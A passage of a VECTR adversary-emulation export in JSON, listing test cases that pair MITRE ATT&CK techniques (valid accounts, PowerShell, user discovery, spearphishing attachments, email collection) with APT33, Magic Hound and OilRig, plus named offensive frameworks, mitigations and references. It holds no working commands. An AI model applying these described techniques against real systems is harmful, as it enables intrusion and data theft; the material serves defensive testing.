credentials.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81","relationship--d3d44322-8902-4f56-8625-fb14557c0ca8","relationship--33e04e78-4d99-49f1-8b10-39b2df7b2419","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","relationship--4bc294a7-8b41-481e-8ed0-fa556375cb6b","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--e38d51a7-a4bc-4489-84c6-703f5d174816","course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d","relationship--89887815-acfc-42f9-9172-81437cf9ff69","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--c8acdf40-8237-487f-8255-91afa327705d","course-of-action--25dc1ce8-eb55-4333-ae30-a7cb4f5894a1","relationship--3c3f26b3-d676-4e17-adca-2a8ea4643148","course-of-action--d45f03a8-790a-4f90-b956-cd7e5b8886bf","relationship--aa6cd875-0e05-4a6c-a249-27c708d50bf4","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","relationship--4f24d075-4d6c-49d2-a213-306e4af2083d","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["Ackerman, G., et al. (2018, December 21). OVERRULED: Containing a Potentially Destructive Adversary. Retrieved January 17, 2019. https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html","Davis, S. and Carr, N. (2017, September 21). APT33: New Insights into Iranian Cyber Espionage Group. Retrieved February 15, 2018. https://www.brighttalk.com/webcast/10703/275683","Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016. https://technet.microsoft.com/en-us/library/dn535501.aspx","Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016. https://technet.microsoft.com/en-us/library/dn487457.aspx","Microsoft. (2016, April 16). Implementing Least-Privilege Administrative Models. Retrieved June 3, 2016. https://technet.microsoft.com/en-us/library/dn487450.aspx","Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019. https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts","Plett, C., Poggemeyer, L. (12, October 26). Securing Privileged Access Reference Material. Retrieved April 25, 2017. https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach","undefined. (n.d.). Retrieved April 12, 2019. https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh","undefined. (n.d.). Risks of Default Passwords on the Internet. Retrieved April 12, 2019. https://www.us-cert.gov/ncas/alerts/TA13-175A"],"mitreId":"T1078"},"blueTeam":{"successfulDetectionBehaviors":["Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","This mitigation describes any guidance or training given to developers of applications to avoid introducing security weaknesses that an adversary may be able to take advantage of.","Take measures to detect or prevent techniques such as [Credential Dumping](https://attack.mitre.org/techniques/T1003) or installation of keyloggers to acquire credentials through [Input Capture](https://attack.mitre.org/techniques/T1056). Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. \n\nFollow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. (Citation: Microsoft Securing Privileged Access) \n\nAudit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. (Citation: TechNet Credential Theft) (Citation: TechNet Least Privilege) These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. \n\nApplications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. (Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet) When possible, applications that use SSH keys should be updated periodically and properly secured. ","Manage the creation, modification, use, and permissions associated to user accounts.","Set and enforce secure password policies for accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--bc4e5a5e-59a3-4af2-b2d7-38156470e7ef","vectrId":"bc4e5a5e-59a3-4af2-b2d7-38156470e7ef","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"bc4e5a5e-59a3-4af2-b2d7-38156470e7ef","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"PowerShell","variant":"APT33 - PowerShell - PowerSploit - Pupy - Empire","objective":"PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)\n---\n[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1086) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has utilized PowerShell to download files from the C2 server and run various scripts.When PowerShell is necessary, restrict PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. \n---\nSet PowerShell execution policy to execute only signed scripts. \n---\nIt may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions.\n\nDisable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.\n---\n[PowerSploit](https://attack.mitre.org/software/S0194) modules are written in and executed via [PowerShell](https://attack.mitre.org/techniques/T1086).\n---\n[Pupy](https://attack.mitre.org/software/S0192) has a module for loading and executing PowerShell scripts.\n---\n[Empire](https://attack.mitre.org/software/S0363) leverages PowerShell for the majority of its client-side agent tasks. [Empire](https://attack.mitre.org/software/S0363) also contains the ability to conduct PowerShell remoting with the <code>Invoke-PSRemoting</code> module.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["8e4883bf-d7b7-40ac-b157-ab6431c02b03","76ca4ddf-5174-57a7-2842-70d5af62a25c","5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0","relationship--cd69ba48-b716-4278-b1a0-2efd3bd2d4de","relationship--b188b994-7965-4c34-81d6-307f218ba80e","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--79568b8a-09c2-40fa-acd9-c7d369059b6a","course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312","relationship--39962764-cf46-4f39-9dd9-95b0ced56d93","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--1f8f6283-6004-4204-a54f-759e9c0519b1","course-of-action--d0415180-51e9-40ce-b57c-c332b0b441f2","tool--13cd9151-83b7-410d-9f98-25d0f0d1d80d","relationship--e7df8e8c-dfc4-48f2-bbd3-46b2572d60ca","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--328636ab-7265-4212-96d4-4ebf2e6a65db","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--095d2af9-dca4-4a7a-b22e-e37923e7c43c","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019. https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/","Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018. https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/","Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016. https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html","Graeber, M. (2014, July 8). PowerSploit. Retrieved February 6, 2018. http://www.powershellmagazine.com/2014/07/08/powersploit/","Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016. https://github.com/jaredhaight/PSAttack","Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016. http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf","Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016. https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","PowerShellMafia. (2012, May 26). PowerSploit - A PowerShell Post-Exploitation Framework. Retrieved February 6, 2018. https://github.com/PowerShellMafia/PowerSploit","PowerSploit. (n.d.). PowerSploit. Retrieved February 6, 2018. http://powersploit.readthedocs.io","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018. http://www.sixdub.net/?p=367"],"mitreId":"T1086"},"blueTeam":{"successfulDetectionBehaviors":["Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. (Citation: Netspi PowerShell Execution Policy Bypass) Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--bfa0da58-81d7-426e-8e03-2edbdbe4720f","vectrId":"bfa0da58-81d7-426e-8e03-2edbdbe4720f","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"bfa0da58-81d7-426e-8e03-2edbdbe4720f","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Owner/User Discovery","variant":"Magic Hound - System Owner/User Discovery - Pupy","objective":"### Windows\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Mac\n\nOn Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.\n\n### Linux\n\nOn Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware has obtained the victim username and sent it to the C2 server.[Pupy](https://attack.mitre.org/software/S0192) can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104","relationship--7ac10827-9bf6-4d60-aa16-9f2d2930b373","relationship--f1000a93-e87d-4acf-b71d-73c3bb05fd75","course-of-action--16f144e4-c780-4ed2-98b4-55d14e2dfa44","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--39e6a7c0-5eb8-49fe-aec7-9ae9fe70723a","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy"],"mitreId":"T1033"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--bfe9444d-c84d-4cf8-8565-97fc064a826b","vectrId":"bfe9444d-c84d-4cf8-8565-97fc064a826b","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"769c1759-3db5-486d-918a-67fbadee4787","templateId":"bfe9444d-c84d-4cf8-8565-97fc064a826b","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Spearphishing Attachment","variant":"OilRig - Spearphishing Attachment","objective":"Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.Block unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n---\nUsers can be trained to identify social engineering techniques and spearphishing emails.\n---\nAnti-virus can also automatically quarantine suspicious files.\n---\nNetwork intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38","relationship--a025d011-6e46-4d3a-a9f7-31324027b7cf","relationship--87b35c42-a798-461b-a58e-2e2d9ea45354","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","relationship--116249f4-b71c-409e-ad9d-7d59d1297d69","course-of-action--8f6b5ca6-263a-4ea9-98f3-afd2a3cd8119","relationship--ce68b332-ac44-472e-81b9-6cffe7ff11a2","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--0bb376d8-f73c-404f-a1bc-9a89c6b7a435","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","relationship--2efc4972-6779-4a5c-a18a-db3c64623b8c","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Lee, B., Falcone, R. (2018, February 23). OopsIE! OilRig Uses ThreeDollars to Deliver New Trojan. Retrieved July 16, 2018. https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/","Lee, B., Falcone, R. (2018, July 25). OilRig Targets Technology Service Provider and Government Agency with QUADAGENT. Retrieved August 9, 2018. https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/","Meyers, A. (2018, November 27). Meet CrowdStrike’s Adversary of the Month for November: HELIX KITTEN. Retrieved December 18, 2018. https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-november-helix-kitten/"],"mitreId":"T1193"},"blueTeam":{"successfulDetectionBehaviors":["Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","Network intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nBlock unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\nBecause this technique involves user interaction on the endpoint, it's difficult to fully mitigate. However, there are potential mitigations. Users can be trained to identify social engineering techniques and spearphishing emails. To prevent the attachments from executing, application whitelisting can be used. Anti-virus can also automatically quarantine suspicious files.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Use signatures or heuristics to detect malicious software.","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--c1f0bdc1-98f5-4b1c-94fc-c5f704a0b2a1","vectrId":"c1f0bdc1-98f5-4b1c-94fc-c5f704a0b2a1","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","templateId":"c1f0bdc1-98f5-4b1c-94fc-c5f704a0b2a1","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Email Collection","variant":"Magic Hound - Email Collection - Pupy","objective":"Adversaries may target user email to collect sensitive information from a target.\n\nFiles containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.\n\nAdversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific key words.(Citation: Black Hills MailSniper, 2017)\n\n### Email Forwarding Rule\n\nAdversaries may also abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: TIMMCMIC, 2014)\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. \n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) has collected .PST archives.Use of multi-factor authentication for public-facing webmail servers is a recommended best practice to minimize the usefulness of usernames and passwords to adversaries.\n---\nEnterprise email solutions have monitoring mechanisms that may include the ability to audit auto-forwarding rules on a regular basis.\n\nIn an Exchange environment, Administrators can use Get-InboxRule to discover and remove potentially malicious auto-forwarding rules.\n---\nUse of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.\n---\n[Pupy](https://attack.mitre.org/software/S0192) can interact with a victim’s Outlook session and look through folders and emails.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f","relationship--b6336d7c-e869-4491-9e8a-5ea5847a58ae","relationship--42ab2855-fe9b-4ed2-bef7-db3a9dcf5a89","course-of-action--383caaa3-c46a-4f61-b2e3-653eb132f0e7","relationship--3709ccc2-2370-4dc9-92ac-792867bbdea4","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","relationship--d60b92c6-2030-4802-8d7d-868ff15f3b0c","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--c15c9cbf-7ecc-4e2b-8fe1-636f381bac63","course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--5c736aad-9847-4059-9d1e-dc2f551952d0","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Bullock, B.. (2017, April 21). Abusing Exchange Mailbox Permissions with MailSniper. Retrieved October 4, 2019. https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper/","Mandiant. (2018). Mandiant M-Trends 2018. Retrieved July 9, 2018. https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf","McMichael, T.. (2015, June 8). Exchange and Office 365 Mail Forwarding. Retrieved October 8, 2019. https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Search Results Web Result with Site Links Tim McMichael. (2014, July 28). Exchange and Office 365: Mail Forwarding. Retrieved August 27, 2019. https://blogs.technet.microsoft.com/timmcmic/2014/07/28/exchange-and-office-365-mail-forwarding/","US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019. https://www.us-cert.gov/ncas/alerts/TA18-086A"],"mitreId":"T1114"},"blueTeam":{"successfulDetectionBehaviors":["Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.\n\nUse of two-factor authentication for public-facing webmail servers is also a recommended best practice to minimize the usefulness of user names and passwords to adversaries.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to collect email data files or access the corporate email server, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Protect sensitive information with strong 